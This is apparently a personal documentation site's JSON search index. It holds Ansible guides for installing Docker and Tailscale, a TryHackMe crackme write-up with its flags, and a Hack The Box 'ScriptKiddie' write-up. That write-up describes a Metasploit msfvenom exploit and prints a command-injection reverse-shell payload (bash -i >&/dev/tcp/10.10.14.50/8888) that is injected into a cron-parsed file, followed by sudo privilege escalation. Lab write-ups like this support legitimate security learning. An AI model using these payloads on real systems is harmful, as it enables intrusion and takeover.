[{"body":"Here lives all the documentations! ","categories":"","description":"","excerpt":"Here lives all the documentations! ","ref":"/docs/","tags":"","title":"Documentation"},{"body":"\nPre-requisites The following components are required to proceed with this guide.\nOne Ansible control node One or more Ansible managed nodes For ease of understanding, this playbook has been divided into 6 sections.\nSection I - Defining scope of execution - hosts: all become: true hosts - Target nodes for this playbook. become - Execute this playbook with elevated privilege. By default, sudo is used to become the root user, reference. Section II - Install required apt packages tasks: - name: Install required apt packages apt: name: - ca-certificates - curl - gnupg - lsb-release - python3-pip state: latest update_cache: true apt - Manage apt packages, reference. name - List of packages to be installed, reference. ca-certificates, curl, gnupg, lsb-release - Requirement as per official Docker Docs. python3-pip - Required to install a few python packages later. state - Desired state of packages, reference. update_cache - Equivalent to running apt-get update before packages installation, reference. Section III - Download Docker GPG key - name: Download Docker GPG key get_url: url: https://download.docker.com/linux/ubuntu/gpg dest: /etc/apt/keyrings/docker.gpg_armored checksum: sha256:1500c1f56fa9e26b9b8f42452a553675796ade0807cdce11975eb98170b3a570 get_url - Download files from remote resource, reference. url - Requirement as per official Docker Docs. dest - Absolute path to download the file to, reference. checksum - SHA-256 checksum of Docker GPG key, makes the file download operation idempotent, reference. Additional information - Armored version of Docker GPG key works just fine. In fact, de-armor process simply converts the key from base64 to binary format.\nSection IV - Add Docker repository - name: \"Add Docker repository\" apt_repository: filename: docker repo: \"deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg_armored] https://download.docker.com/linux/ubuntu {{ ansible_lsb.codename }} stable\" state: present apt_repository - Add specified repository into /etc/apt/sources.list.d, reference. filename - .list extension will be automatically added, reference. repo - Source string of repository, reference. {{ ansible_lsb.codename }} - Leverage Ansible facts to dynamically obtain version of Ubuntu (e.g. bionic, focal, jammy), reference. state - State of source string, reference. Section V - Install Docker and relevant packages - name: Install Docker and relevant packages apt: name: - docker-ce - docker-ce-cli - containerd.io - docker-buildx-plugin - docker-compose-plugin state: latest apt - Manage apt packages, reference. name - List of packages to be installed, reference. docker-ce, docker-ce-cli, containerd.io, docker-buildx-plugin, docker-compose-plugin - Requirement as per official Docker Docs. state - Desired state of packages, reference. Section VI - Install required Python packages - name: Install required Python packages pip: name: - docker - docker-compose pip - Manage Python library dependencies, reference. name - List of Python library to be installed, reference. docker - Requirement for community.docker Ansible module, reference. docker-compose - Requirement for community.docker.docker_compose Ansible module, reference. Wrapping up - playbook recap Feel free to adapt this playbook to fit your environment/needs!\n- hosts: all become: true tasks: - name: Install required apt packages apt: name: - ca-certificates - curl - gnupg - lsb-release - python3-pip state: latest update_cache: true - name: Download Docker GPG key get_url: url: https://download.docker.com/linux/ubuntu/gpg dest: /etc/apt/keyrings/docker.gpg_armored checksum: sha256:1500c1f56fa9e26b9b8f42452a553675796ade0807cdce11975eb98170b3a570 - name: \"Add Docker repository\" apt_repository: filename: docker repo: \"deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg_armored] https://download.docker.com/linux/ubuntu {{ ansible_lsb.codename }} stable\" state: present - name: Install Docker and relevant packages apt: name: - docker-ce - docker-ce-cli - containerd.io - docker-buildx-plugin - docker-compose-plugin state: latest - name: Install required Python packages pip: name: - docker - docker-compose ","categories":["devops","ansible"],"description":"","excerpt":"\nPre-requisites The following components are required to proceed with …","ref":"/docs/devops/ansible/docker-installation/","tags":["docker"],"title":"Automate Docker Installation with Ansible on Ubuntu"},{"body":"Update (March 2023) - Task files and flags are now provided below, since the Reverse Engineering room has become private on TryHackMe. Task File Flag crackme1 hax0r crackme2 4988 crackme3 azt Hello and welcome!\nBefore we begin, a quick heads up that we will be reversing mainly on Radare2, so get yours ready if you haven’t already had one! Otherwise, feel free to use any disassemblers of your choice!\nHere’s the link to the Reverse Engineering room on Try Hack Me, which is what we’ll be focusing on later on. Also, consider starting with the much more beginner friendly Reversing ELF room if you’re new to reversing!\nWith that said, let’s begin!\nCrackme1 This first crackme file will give you an introduction to if statements and basic function calling in assembly.\nWith test provided to the password prompt, the binary returns a string of password is incorrect.\nDisassembling crackme1.bin with Radare2.\nRunning aaa command to analyze all functions within the binary.\nafll to list out details of all functions. We’ll first start with disassembling of the main function.\npdf @main to disassemble the main function. By this point you should be able to spot the flag pretty easily already.\nNow that we’ve obtained the flag, let’s try diving a little deeper and get a better understanding of those assembly instructions!\nFrom what we could observe, there seems to be 8 important segments of code. Their explanations are as following:\nPrint enter password string.\nStore the flag into var_14h.\nLoad the address of var_eh into rax, then copies it to rsi, such that rsi would have the address of var_eh. Also load an address in the memory which contains %s into rdi.\nThese two arguments, rsi and rdi will be used as parameters for the calling of scanf() in 4th segment.\nCalling of scanf().\nrdi which holds %s, tells scanf() it should expect a string input. rsi which holds memory address of var_eh, tells scanf() where to store the string input. Consist of the following operations.\nLoad the address of var_14h into rdx, then copies it to rsi. Load the address of var_eh into rax, then copies it to rdi. In a sense, rsi would contain address of the flag, rdi would contain address of our string input. They will be used as parameters for calling of strcmp(). eax will be used to store the return value of strcmp(). 0 is returned by strcmp() if both strings are equal. Non-zero value is returned by strcmp() if both strings are not equal. Copy eax to var_18h, then compare it against 0.\nJump to 8th segment if they aren’t equal, otherwise proceed to 7th segment.\nPrint password is correct.\nPrint password is incorrect.\nFeel free to take a moment to digest/understand all these steps!\nFlag verification.\nCrackme2 This is the second crackme file — Unlike the first file, this will involve examining registers, how and where values are compared\nNothing too special, this is done mostly to observe how the strings correlates with behavior of the binary.\nDisassembling crackme2.bin with Radare2.\naaa to analyze all functions within the binary.\nafll to list out details of all functions. Again, we’ll first start with disassembling of the main function.\nUnlike the previous crackme, there seems to be no obvious sign of flags in this one. But one thing for sure, we are trying to get the code in the 5th segment to execute. So, let’s begin with another round of analysis.\nPrint enter your password string.\nLoad the address of var_ch into rax, then copies it to rsi, such that rsi would have the address of var_ch.\nAlso loads an address in the memory which holds %d into rdi.\nThese two arguments, rsi and rdi will be used as parameters for the calling of scanf() in 3rd segment.\nCalling of scanf().\nrdi which holds %d tells scanf() it should expect a decimal integer input rsi which holds memory address of var_ch tells scanf() where to store the string input. Copy the value of var_ch (our decimal integer input!) to eax, then compare it against a hex value.\nJump to 6th segment if they aren’t equal, otherwise proceed to 5th segment.\nAs such, the hex value should be our flag!\nPrint password is valid.\nPrint password is incorrect.\nOverall, the assembly code of crackme2 is more straight-forward in comparison to crackme1.\nFlag verification.\nCrackme3 This crackme will be significantly more challenging — it involves learning how loops work, and how they are represented in assembly\nUnlike the previous ones, the third challenge will require us to carry over what we’ve learned earlier, and observe how they are incorporated into loops.\nCool, got our good old password is incorrect.\nDisassembling crackme3.bin with Radare2.\naaa to analyze all functions within the binary.\nafll to list out details of all functions. Let’s start disassembling the main function.\nLooks like we’ve got something interesting going on in the middle. Let’s switch over to graph view to get a better view.\nsf main to seek to address of main function.\nVV to switch to visual mode and view graphs. Some rough explanations:\nTakes in our input, also initiates the loop counter to 0.\nCondition check for the loop, goes to 3rd segment (flag checking) if the loop counter is less than or equal to 2, otherwise proceed to 5th segment.\nFlag checking operation, compares our input one character at a time against the flag.\nGoes to 4th segment (counter increment) if they match, otherwise proceed to 6th segment.\nIncrement loop counter by 1.\nPrint password is correct.\nPrint password is incorrect.\nThus, our goal is to figure out the input needed for crackme3 to execute in the following order!\n1234 → 234 → 234 → 25\nThere are lots of methods to go about obtaining the flag, but the easiest way should be observing how our input affects the highlighted instruction in the figure above, as it directly decides if the loop counter should be incremented (which we obviously want it to).\nPress q 2 times to return to CLI interface.\ndb 0x561331e0077c to set breakpoint at the specified instruction.\nWe’ll try to observe how our input values affect those two registers - dl, al\ndc to start start/continue execution. We’ll provide an input of ABCD (0x41, 0x42, 0x43, 0x44), just because they are easier to spot in the memory. dr to show value stored in registers. As a side note, dl is the lowest 8 bit of rdx, al is the lowest 8 bit of rax. Interesting… It seems that rdx holds the hex value from the first character (A) of our input string. Furthermore, it is being compared against rax, 0x00000061, which means…\nThe first character of our flag is an a!\nFeel free to take a moment to understand how/why it is so.\nGot it? We’ll modify the value of the rdx register to match rax before continuing execution, so that the loop doesn’t break.\nHit our second breakpoint, same concept as before, we’ll modify rdx register to match rax, the second character of the flag - z.\nLast character of the flag.\nVoila!\nAfterthoughts Overall, the Reverse Engineering room was a decent learning experience for myself on the following concepts of assembly language:\nConditional statements Values comparison Loops I’ve had a good amount of eureka moments throughout these crackmes and they were truly amazing!\n","categories":["ctf"],"description":"","excerpt":"Update (March 2023) - Task files and flags are now provided below, …","ref":"/docs/capture-the-flag/try-hack-me/reverse-engineering/","tags":["thm"],"title":"Reverse Engineering Writeup"},{"body":"","categories":"","description":"Repository of Hack The Box writeups.\n","excerpt":"Repository of Hack The Box writeups.\n","ref":"/docs/capture-the-flag/hack-the-box/","tags":"","title":"Hack The Box Writeups"},{"body":"\nScript Kiddie!\nWhat is the author (0xdf) implying to us?\nA box for script kiddies?\nOr is it a box for us to stand out from the script kiddies?\nMy guess would be the latter…\nKeep in mind, the destination (root.txt) is not what’s important, it’s the journey (every line that got us to root.txt) that counts.\nWith that said, let’s begin!\nEnumeration Nmap scan reveals Werkzeug httpd 0.16.1 (Python 3.8.5) running on port 5000.\nQuite a few options are available to play with… Nmap, Msfvenom, Searchsploit…\nThe Werkzeug module available from Metasploit will spawn a Python shell, provided if we had access to a Werkzeug debug console. But since we don’t, this exploit is unusable for us.\nExploitation The exploit we are using is CVE-2020–7384, one that leverages the mishandling of apk files by Msfvenom to grant us a reverse shell.\nWe’ll start by configuring the necessary parameters in Metasploit.\nSetting up Netcat listener on port 4444.\nWith the os set as Android, lhost set as some funny ip, we can proceed to upload the APK.\nVoila! And we’ve got user access to the machine.\nPrivilege Escalation /home/pwn/scanlosers.sh\nhome/kid/logs/hackers\nThere’s an interesting script scanlosers.sh, within user directory of pwn, but we (the kid user) unfortunately only have read access to it.\nThat said, since it takes in input from the hackers file, which we is owned by us (kid). Thus, scanlosers.sh is still accessible by us in some ways.\nAfter writing some random stuff into hackers, but the file seems to remain empty. It brought up suspicion that a cronjob of scanlosers.sh was running, as the last line of scanlosers.sh - echo -n \u003e $log will clear the hackers file.\nFirst Shell: echoing hello into hackers\nSecond Shell: running pspy64, catches the cronjob of our payload hello\nTo confirm our suspicion, we will use pspy, a command line tool designed for snooping on commands run by other users, cron jobs, etc.\nI have downloaded the 64-bit binary version and used nc to transfer the binary over to the Script Kiddie machine. (feel free to skip this step or try it out for yourself)\nInitiate two reverse shells. The first shell runs our test payload hello The second shell runs the pspy64 binary, and was able to catch the details of the cronjob. Indeed, we are able to confirm a cronjob was running in the background, meaning that /home/pwn/scanlosers.sh will be executed for each time /home/kid/log/hackers is being altered.\nSome explanations, our payload is basically a Bash TCP Shell. Description for each gate from scanlosers.sh are as following:\nRemove tuna and salmon. Sort our payload if it has more than one line, since we don’t, we’re good. Stores our payload into the ip variable. When our payload is parsed and executed, they will be run as:\nsh -c “nmap --top-ports 10 -oN recon/;\nDoesn’t do anything since it is an incomplete nmap command, no ip address is supplied. /bin/bash -c ‘bash -i \u003e\u0026/dev/tcp/10.10.14.50/8888 0\u003e\u00261’\nThe Bash TCP Shell we need! #.nmap ${ip} 2\u003e\u00261 \u003e/dev/null” \u0026...\nUsing the # to comment out everything else Setting up Netcat listener on port 8888.\nMoment of Truth!\nWriting our payload into hackers.\necho “tuna salmon ;/bin/bash -c ‘bash -i \u003e\u0026/dev/tcp/10.10.14.50/8888 0\u003e\u00261’ #” \u003e\u003e hackers\nAfter having logged in as pwn, with sudo -l we found out that we are able to run msfconsole as root without the need of password.\nNow let’s run msfconsole as sudo.\nsudo /opt/metasploit-framework-6.0.9/msfconsole\nJackpot!\nAnd there we have it!\nAfterthoughts Overall, ScriptKiddie teaches the basic yet core concepts of the HTB platform:\nMetasploit Cronjobs Bash scripting sudo -l It is one box that should definitely be recommend for the newcomers!\n","categories":["ctf"],"description":"","excerpt":"\nScript Kiddie!\nWhat is the author (0xdf) implying to us?\nA box for …","ref":"/docs/capture-the-flag/hack-the-box/script-kiddie/","tags":["htb"],"title":"Script Kiddie Writeup"},{"body":"","categories":"","description":"Repository of Try Hack Me writeups.\n","excerpt":"Repository of Try Hack Me writeups.\n","ref":"/docs/capture-the-flag/try-hack-me/","tags":"","title":"Try Hack Me Writeups"},{"body":"\nPre-requisites The following components are required to proceed with this guide.\nOne Ansible control node One or more Ansible managed nodes For ease of understanding, this playbook has been divided into 4 sections.\nSection I - Defining scope of execution - hosts: all become: true hosts - Target nodes for this playbook. become - Execute this playbook with elevated privilege. By default, sudo is used to become the root user, reference. Section II - Download Tailscale GPG key and repository tasks: - name: Download Tailscale GPG key get_url: url: https://pkgs.tailscale.com/stable/ubuntu/{{ ansible_lsb.codename }}.noarmor.gpg dest: /usr/share/keyrings/tailscale-archive-keyring.gpg checksum: sha256:3e03dacf222698c60b8e2f990b809ca1b3e104de127767864284e6c228f1fb39 - name: Download Tailscale repository get_url: url: https://pkgs.tailscale.com/stable/ubuntu/{{ ansible_lsb.codename }}.tailscale-keyring.list dest: /etc/apt/sources.list.d/tailscale.list checksum: sha256:e0acc200aebb45a3d67b4b66524100f8c1f4497866958654798fc4ba09d49f3f get_url - Download files from remote resource, reference. url - Requirement as per official Tailscale Docs. {{ ansible_lsb.codename }} - Leverage Ansible facts to dynamically obtain version of Ubuntu (e.g. bionic, focal, jammy), reference. dest - Absolute path to download the file to, reference. checksum - SHA-256 checksum of Tailscale GPG key and repository, makes the file download operation idempotent, reference. Section III - Install Tailscale - name: Install Tailscale apt: name: - tailscale state: latest update_cache: true apt - Manage apt packages, reference. name - List of packages to be installed, reference. tailscale - tailscale will be installed. state - Desired state of packages, reference. update_cache - Equivalent to running apt-get update before packages installation, reference. Section IV - Connect to Tailscale network - name: Connect to Tailscale network command: tailscale up --authkey tskey-your-auth-key command - Command to be executed, reference. Additional information - Be sure to use secrets management system of some sort (e.g. Ansible Vault / HashiCorp Vault) to handle your Tailscale auth key! It’s never a good idea to store secrets as plaintext in playbooks!\nWrapping up - playbook recap Feel free to adapt this playbook to fit your environment/needs!\n- hosts: all become: true tasks: - name: Download Tailscale GPG key get_url: url: https://pkgs.tailscale.com/stable/ubuntu/{{ ansible_lsb.codename }}.noarmor.gpg dest: /usr/share/keyrings/tailscale-archive-keyring.gpg checksum: sha256:3e03dacf222698c60b8e2f990b809ca1b3e104de127767864284e6c228f1fb39 - name: Download Tailscale repository get_url: url: https://pkgs.tailscale.com/stable/ubuntu/{{ ansible_lsb.codename }}.tailscale-keyring.list dest: /etc/apt/sources.list.d/tailscale.list checksum: sha256:e0acc200aebb45a3d67b4b66524100f8c1f4497866958654798fc4ba09d49f3f - name: Install Tailscale apt: name: - tailscale state: latest update_cache: true - name: Connect to Tailscale network command: tailscale up --authkey tskey-your-auth-key ","categories":["devops","ansible"],"description":"","excerpt":"\nPre-requisites The following components are required to proceed with …","ref":"/docs/devops/ansible/tailscale-installation/","tags":["tailscale"],"title":"Automate Tailscale Installation with Ansible on Ubuntu"},{"body":"","categories":"","description":"Repository of DevOps related guides.\n","excerpt":"Repository of DevOps related guides.\n","ref":"/docs/devops/","tags":"","title":"DevOps"},{"body":"","categories":"","description":"Repository of Mikrotik related articles.\n","excerpt":"Repository of Mikrotik related articles.\n","ref":"/docs/networking/mikrotik/","tags":"","title":"Mikrotik"},{"body":"","categories":"","description":"Repository of networking related articles.\n","excerpt":"Repository of networking related articles.\n","ref":"/docs/networking/","tags":"","title":"All Things Networking Related"},{"body":"","categories":"","description":"Repository of Ansible related guides.\n","excerpt":"Repository of Ansible related guides.\n","ref":"/docs/devops/ansible/","tags":"","title":"Ansible"},{"body":"","categories":"","description":"Repository of CTF writeups. The main goal of this section is to **look beyond CTF as sport activities, and to relate them with actual flaws in production environment**.\n","excerpt":"Repository of CTF writeups. The main goal of this section is to **look …","ref":"/docs/capture-the-flag/","tags":"","title":"CTF Writeups"},{"body":"","categories":"","description":"","excerpt":"","ref":"/categories/ansible/","tags":"","title":"ansible"},{"body":"","categories":"","description":"","excerpt":"","ref":"/categories/","tags":"","title":"Categories"},{"body":"","categories":"","description":"","excerpt":"","ref":"/categories/devops/","tags":"","title":"devops"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/","tags":"","title":"Tags"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/tailscale/","tags":"","title":"tailscale"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/docker/","tags":"","title":"docker"},{"body":"","categories":"","description":"","excerpt":"","ref":"/categories/ctf/","tags":"","title":"ctf"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/thm/","tags":"","title":"thm"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/htb/","tags":"","title":"htb"},{"body":" About Myself Past Experiences ","categories":"","description":"","excerpt":" About Myself Past Experiences ","ref":"/about/","tags":"","title":"About Myself"},{"body":"","categories":"","description":"","excerpt":"","ref":"/blog/","tags":"","title":"Bits and Pieces of Life!"},{"body":" Foreword Hello there, thanks for dropping by and welcome!\nMy objective of building this site is to promote knowledge sharing across all levels. Suggestions and feedback are most welcomed! 😃\nFeel free to explore around, learn things, and use it to build your own projects!\nAs always, my life goal has been clear to myself and it is to fight against extreme poverty, with my own hands, knowledge, hard-earned assets, and ultimately - with technology itself!\nLive towards your goal. Live without regrets. Live life to the fullest!!\n","categories":"","description":"","excerpt":" Foreword Hello there, thanks for dropping by and welcome!\nMy …","ref":"/","tags":"","title":"Sam Docs"}]